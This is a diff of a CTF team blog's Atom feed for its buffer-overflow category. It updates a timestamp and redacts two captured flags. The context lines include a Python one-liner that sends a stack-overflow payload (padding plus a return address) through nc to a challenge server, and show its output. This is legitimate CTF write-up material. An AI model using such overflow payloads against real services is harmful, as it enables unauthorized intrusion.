@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Bof | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/bof/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T03:20:34+04:30</updated>
+  <updated>2015-04-03T19:00:38+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -143,7 +143,7 @@ t.interact()
 </code></pre>
 
 <pre><code>$ python sol.py 
-ebe2c4abf85c239c7bd0385a685c460b2c5fe1dcdb2236f87dfef826bb690adf
+[redacted]
 *** Connection closed by remote host ***
 </code></pre>
 
@@ -242,7 +242,7 @@ gdb-peda$
 
 <pre><code>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
 ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
-96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a
+[redacted]
 </code></pre>
 
 <p>And another 100 pt.</p>
